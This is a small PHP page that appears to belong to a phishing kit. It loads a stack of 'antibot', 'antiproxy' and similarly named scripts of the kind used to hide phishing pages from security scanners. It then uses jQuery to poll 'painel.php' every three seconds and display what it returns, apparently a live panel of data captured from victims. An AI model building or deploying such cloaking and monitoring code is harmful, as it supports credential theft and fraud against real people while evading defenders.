<?php 

require '../MagnumAntibot.php';
require '../MagnumAntibot2.php';
require '../MagnumAntibot3.php';
require '../MagnumAntibot4.php';
require '../MagnumAntibot5.php';
require '../MagnumAntibot6.php';
require '../MagnumAntibot7.php';
require '../MagnumAntibot8.php';
require "../antiproxy.php";
require "../bot.php";
require "../fucker.php";

?>
<!DOCTYPE html>
<html>
<head>
	<title>
	
	</title>
		<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>

<script>
	 $(document).ready(function() {
      atualizarDados(); // Atualizar dados imediatamente ao carregar a página

      // Atualizar os dados a cada 5 segundos
      setInterval(atualizarDados, 3000);
    });

    function atualizarDados() {
		// var ip = document.getElementById('ip').value;
      $.ajax({
        url: "painel.php", //+ ip,
        type: 'GET',
        success: function(response) {
          $('#dados').html(response);

        },
        error: function(xhr, status, error) {
          console.log(error);
        }
      });
    }
</script>
<div id="dados">
	
</div>
</body>
</html>